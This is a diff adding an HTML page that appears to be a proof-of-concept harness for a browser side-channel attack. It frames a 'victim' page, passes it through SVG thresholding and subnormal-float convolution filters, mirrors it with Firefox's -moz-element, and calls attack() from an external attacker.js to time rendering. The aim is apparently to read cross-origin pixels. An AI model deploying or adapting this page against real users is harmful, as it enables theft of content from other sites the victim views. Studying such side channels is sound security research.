@@ -1,0 +1,66 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<svg>
+<defs>
+    <filter id="blackwhite">
+        <feColorMatrix type="matrix"
+            values="0.3333 0.3333 0.3333 0 0
+                    0.3333 0.3333 0.3333 0 0
+                    0.3333 0.3333 0.3333 0 0
+                    0 0 0 1 0" result="gray"/>
+        <feComponentTransfer in="gray">
+            <feFuncR type="discrete" tableValues="0 1" />
+            <feFuncG type="discrete" tableValues="0 1" />
+            <feFuncB type="discrete" tableValues="0 1" />
+        </feCompnentTransfer>
+    </filter>
+    <filter id="fsubnormal">
+        <feConvolveMatrix in="SourceGraphic"
+        order="2 2" edgeMode="duplicate"
+        kernelMatrix="1e-42 1e-42 1e-42 1e-42"
+        preserveAlpha="false" />
+    </filter>
+</defs>
+</svg>
+<style>
+#victim {
+  height: 1px;
+  width: 1px;
+  border: 0px;
+  padding: 0px;
+  overflow: scroll;
+  filter: url(#blackwhite);
+}
+
+#inspect {
+  background: -moz-element(#victim);
+  border: 0px;
+  padding: 0px;
+  overflow: hidden;
+  height: 200px;
+  width: 200px;
+}
+
+.subnormal {
+    filter: url(#fsubnormal);
+}
+</style>
+<script type="text/javascript" src="attacker.js"></script>
+</head>
+<body style="background-color:powderblue;">
+<div id="victim">
+<iframe src="victim_char.html" width="100" height="100" frameBorder="0"></iframe>
+</div>
+<div id="inspect"></div>
+<script type="text/javascript">
+name = "char200";
+col_max = 20;
+row_max = 20;
+index = 0;
+duration = 0.0;
+times = [];
+attack();
+</script>
+</body>
+</html>
